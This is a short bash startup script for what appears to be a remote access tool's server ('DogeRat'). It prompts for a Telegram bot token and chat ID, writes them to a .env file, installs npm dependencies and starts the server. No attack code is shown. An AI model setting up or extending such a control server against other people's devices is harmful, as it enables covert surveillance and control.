#!/bin/bash

# DogeRat Server Startup Script

echo "================================"
echo "  DogeRat Server v3.0"
echo "================================"
echo ""

# Check if .env file exists
if [ ! -f "server/.env" ]; then
    echo "Configuring server..."
    echo ""
    echo "Enter your Telegram Bot Token:"
    read -r bot_token
    echo ""
    echo "Enter your Telegram Chat ID:"
    read -r chat_id
    echo ""
    
    # Create .env file
    cat > server/.env << EOF
# DogeRat Server Configuration
TELEGRAM_BOT_TOKEN=$bot_token
TELEGRAM_CHAT_ID=$chat_id
PORT=8999
EOF
    
    echo "Configuration saved!"
    echo ""
fi

# Install dependencies if needed
if [ ! -d "node_modules" ]; then
    echo "Installing dependencies..."
    npm install
    echo ""
fi

# Start the server
echo "Starting server..."
echo ""
npm start
